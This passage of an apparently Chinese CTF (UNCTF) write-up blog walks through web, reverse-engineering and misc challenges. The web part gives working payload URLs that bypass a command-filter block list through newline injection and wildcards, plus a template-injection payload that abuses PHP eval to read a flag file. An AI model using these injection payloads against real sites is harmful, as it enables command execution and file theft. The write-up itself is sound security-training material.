class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-b"</span>;&#125;</span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" alt="img"></a></p>
<p><a href="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" alt="img"></a></p>
<p>同时，a,b就都可以用斜杠了，</p>
<p>于是就可以闭合引号后任意命令执行</p>
<p>对于命令的过滤有两种绕过方法，一个是linux下，用通配符?绕过，比如var写成v?r</p>
<p>解题：</p>
<ol>
<li><p><a href="http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a</a></p>
</li>
<li><p>flag不在根目录下，那就找找，</p>
</li>
</ol>
<ul>
<li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a</a></li>
</ul>
<ol>
<li>找到了</li>
</ol>
<ul>
<li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a</a></li>
</ul>
<p><a href="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" alt="img"></a></p>
<p>flag：unctf{86dfe85d7c5842c5c04adae104193ee1}</p>
<h3 id="审计一下世界上最好的语言吧"><a href="#审计一下世界上最好的语言吧" class="headerlink" title="审计一下世界上最好的语言吧"></a>审计一下世界上最好的语言吧</h3><p>先丢进Seay</p>
<p><a href="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" alt="img"></a></p>
<p>parse_template.php中有一个eval</p>
<p>查一下调用关系：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">index.php：parse_again($searchword);</span><br><span class="line"></span><br><span class="line">parse_template.php:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $template_html,$searchword;</span><br><span class="line">    $searchnum    = <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;</span><br><span class="line">    $type      = <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;</span><br><span class="line">    $typename = <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">    $template_html = parseIf($template_html);</span><br><span class="line">    <span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br></pre></td></tr></table></figure>

<p>然后看到template.html，搜索searchword和searchnum</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchword&#125;</span><span class="xml"> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchnum&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>个影片 第<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>页<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>最后再看看RemoveXSS</p>
<p>发现 if:,</p>
<p>解题思路：</p>
<p>首先利用四次的strreplace绕过RemoveXss,控制$templatehtml</p>
<p>然后是绕过判断和正则：{if:开头、{end if}结尾，然后真正执行的命令要在rule匹配到的第一个（.*?）</p>
<p>破题：</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$searchnum=&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">$searchword=&#123;<span class="keyword">if</span>&#123;haha:<span class="keyword">type</span>&#125;</span><br><span class="line"></span><br><span class="line">$<span class="keyword">type</span>=:read&#123;haha:typename&#125;</span><br><span class="line"></span><br><span class="line">$typename=file(%27flag.php%27)&#125;</span><br></pre></td></tr></table></figure>

<p>这样content被替换为</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;<span class="keyword">if</span>:readfile(%27flag.php%27)&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;end <span class="keyword">if</span>&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>个影片 第<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>页<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>正则过后$iar为</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="meta">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &#123;<span class="keyword">if</span>:readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)&#125;&lt;/a&gt; &lt;small&gt;共有&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &lt;/a&gt; &lt;small&gt;共有&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后$strIf被赋值为readfile(%27flag.php%27)</p>
<p>然后 @eval(“if(readfile(%27flag.php%27)) { $ifFlag=true;} else{ $ifFlag=false;}”);</p>
<p>readlfile输出flag</p>
<p>最终payload：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchnum=&#123;end <span class="keyword">if</span>&#125;&amp;content=<span class="symbol">&lt;search&gt;</span>&#123;<span class="keyword">if</span>&#123;hah<span class="variable">a:type</span>&#125;&lt;/<span class="built_in">search</span>&gt;&amp;<span class="built_in">type</span>=:<span class="keyword">read</span>&#123;hah<span class="variable">a:typename</span>&#125;&amp;typename=<span class="keyword">file</span>(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" alt="img"></a></p>
<p>flag：UNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>逆向签到题，</p>
<p>主要函数</p>
<p><a href="https://p0.ssl.qhimg.com/t01acfae537b2029f57.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>然后找到一些关键值，再根据加密逻辑写解密脚本即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">'''izwhroz""w"v.K".Ni'''</span></span><br><span class="line">key=<span class="number">0x12</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">3</span>):</span><br><span class="line">    flag+=chr((ord(cipher[i])^key)<span class="number">-6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">1</span>])^key)+<span class="number">6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">2</span>])^key)^<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>得到flag：unctf{b666b666b}</p>
<h3 id="神奇的数组"><a href="#神奇的数组" class="headerlink" title="神奇的数组"></a>神奇的数组</h3><p><a href="https://p5.ssl.qhimg.com/t01b1b5242af8d6740b.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>打开主函数，读一下程序逻辑，结合大小端存储顺序。好的，flag就是checkbox里照抄。</p>
<p><a href="https://p2.ssl.qhimg.com/t01ea30e449f32cf1a9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>flag：ad461e203c7975b35e527960cbfeb06c</p>
<h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>手动脱壳+动调，直接出flag23333</p>
<p><a href="https://p1.ssl.qhimg.com/t01243cb805fa8ffd23.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p><a href="https://p2.ssl.qhimg.com/t01e0f7ec207dfc09cb.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p><a href="https://p1.ssl.qhimg.com/t01f7bcda3fa207272c.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>flag：flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
<h3 id="unctfeasyMaze"><a href="#unctfeasyMaze" class="headerlink" title="unctfeasyMaze"></a>unctfeasyMaze</h3><p>解法一：ida反汇编后程序逻辑就是对地图进行了两次初始化，然后就是正常走迷宫了</p>
<p>将断点设置在地图第二次初始化完成后，然后查看RSI的值</p>
<p><a href="https://p1.ssl.qhimg.com/t01737c26b1931378a3.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>7个一行排列</p>
<p><a href="https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>走完即可得到flag</p>
<p><a href="https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>flag：UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
<p>解法二：爆破</p>
<p>运行了程序后发现可以一步一步走，一旦走错就会报错</p>
<p>于是可以按位爆破，最多也就是试4*29次，很快的。。。（至少比misc那个走迷宫要快）</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="信号不好我先走了"><a href="#信号不好我先走了" class="headerlink" title="信号不好我先走了"></a>信号不好我先走了</h3><p>下载得到图片，看了十六进制没有隐藏东西，于是用神器Stegsolve试一波LSB</p>
<p><a href="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" alt="img"></a></p>
<p>果然有东西，藏了一个zip包。</p>
<p>保存下来解压缩得到一个张跟之前一样的图片。</p>
<p>盲猜盲水印，工具一把梭，得到</p>
<p><a href="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" alt="img"></a></p>
<p>flag：unctf{9d0649505b702643}</p>
<h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>原以为是mp3隐写，然而没有密码。</p>
<p>看十六进制数据发现有一个zip包在底下，</p>
<p>然后注释有提示</p>
<p>根据提示，和歌名，在qq音乐 海阔天空 李现 的评论区，在对应评论时间找到密码：真的上头</p>
<p>解压得到一张图片，看十六进制数据，底下隐写了一个word文档，</p>
<p>word打开，发现右下角有端倪，是图片一角，拖出来得到flag</p>
<p>（或者直接把word文档当zip打开，在word文件夹中的media文件夹中也有flag 的图片）</p>
<p><a href="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" alt="img"></a></p>
<p>flag：UNCTF{W3L0v3Unctf}</p>
<h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>终于出现了签到题，玩游戏得flag</p>
<p><a href="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" alt="img"></a></p>
<p>flag：UNCTF{c783910550de39816d1de0f103b0ae32}</p>
<h3 id="Happy-Puzzle"><a href="#Happy-Puzzle" class="headerlink" title="Happy Puzzle"></a>Happy Puzzle</h3><p>手撕PNG呗，提示里的RGB没管，400*400比较有用，</p>
<p>最基本的PNG组成：文件头，IHDR，IDAT（len(data)+’IDAT’+data+crc），IEND，和随处可见的crc32校验（这玩意儿坑惨我了）</p>
<p>用windows比较方便的是，crc不用算，用0占位即可，IEND也可以不用加</p>
<p>解题过程：</p>
<ol>
<li>随便找个PNG，拿到png文件头+IHDR的数据</li>
<li>改宽高</li>
<li>给所有data文件，前面接上len(data)，即00002800，IDAT，再给末尾加上00000000占crc32的位</li>
<li>做出26张图，看哪张图有图像，然后以此类推的再往后加data</li>
</ol>
<ul>
<li>结果：</li>
</ul>
<p><a href="https://p1.ssl.qhimg.com/t01ebe3f81bfa8ebd96.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>贴上半自动exp：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line">head=<span class="string">'89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'</span></span><br><span class="line">idata=<span class="string">'0000280049444154'</span></span><br><span class="line">crc=<span class="string">"1bad748e"</span></span><br><span class="line">with <span class="built_in">open</span>(filename,<span class="string">"rb"</span>) as f:</span><br><span class="line">       data = f.<span class="built_in">read</span>().encode(<span class="string">"hex"</span>)</span><br><span class="line">rootdir = <span class="string">''</span></span><br><span class="line">list = <span class="built_in">os</span>.listdir(rootdir) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(list)):</span><br><span class="line">       <span class="built_in">path</span> = <span class="built_in">os</span>.<span class="built_in">path</span>.join(rootdir,list[i])</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">os</span>.<span class="built_in">path</span>.isfile(<span class="built_in">path</span>) <span class="keyword">and</span> <span class="built_in">path</span>[<span class="number">-5</span>:]==<span class="string">'.data'</span>:</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>,<span class="string">"rb"</span>) as f:</span><br><span class="line">                     txt = f.<span class="built_in">read</span>()</span><br><span class="line">                     txt=data+idata+txt.encode(<span class="string">"hex"</span>)+crc</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>.replace(<span class="string">"puzzle"</span>,<span class="string">"puzzle2"</span>).replace(<span class="string">"data"</span>,<span class="string">"png"</span>),<span class="string">"wb"</span>) as f:</span><br><span class="line">                     f.<span class="built_in">write</span>(txt.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>

<p>flag：ucntf{312bbd92c1b291e1827ba519326b6688}</p>
<h3 id="think"><a href="#think" class="headerlink" title="think"></a>think</h3><p>用python的匿名函数一句话制作出的题目</p>
<p><a href="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" alt="img"></a></p>
<p>关键在这里，check函数判断checknum，如果checknum为1，就打印(<strong>print(‘Congratulation!’), (</strong>print(decrypt(key, encrypted)),猜测后面半部分就是flag</p>
<p>于是，直接运行代码，然后在IDLE里键入check(1)，得到flag</p>
<p><a href="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" alt="img"></a></p>
<p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
<h3 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h3><p>下载拿到三个里面全是十六进制的文件</p>
<p>看到03 04 05 06 01 02</p>
<p>就意识到这三个是被去掉了50 4B的zip包的三段数据</p>
<p>用010editor拼接起来后得到一个压缩包，里面是一个图片</p>
<p>用010editor打开图片后底下藏了一个zip包</p>
<p>解压得到一串密文：”K&lt;jslc7b5’gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\X#9YhiSHV#”</p>
<p>base全家桶走一遍，最后确定是base92</p>
<p><a href="https://p2.ssl.qhimg.com/t0183d046de0ef60b68.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>得到flag：unctf{cca1a567c3145b1801a4f3273342c622}</p>
<h3 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h3><p>nc连上后是个数独题，不过是非常规的，只需要行和列不重复即可</p>
<p>魔改了个大佬的脚本：<a href="https://blog.csdn.net/zonnin/article/details/78813698" target="_blank" rel="noopener">https://blog.csdn.net/zonnin/article/details/78813698</a></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from pwn import *</span><br><span class="line"><span class="built_in">context</span>.log_level='debug'</span><br><span class="line">sh = remote('<span class="number">101.71</span>.29.5',<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">content</span> = sh.recvuntil(<span class="string">"answer :\n"</span>)[<span class="number">339</span>:<span class="number">718</span>].replace(<span class="string">"\n"</span>,<span class="string">""</span>).<span class="built_in">split</span>(<span 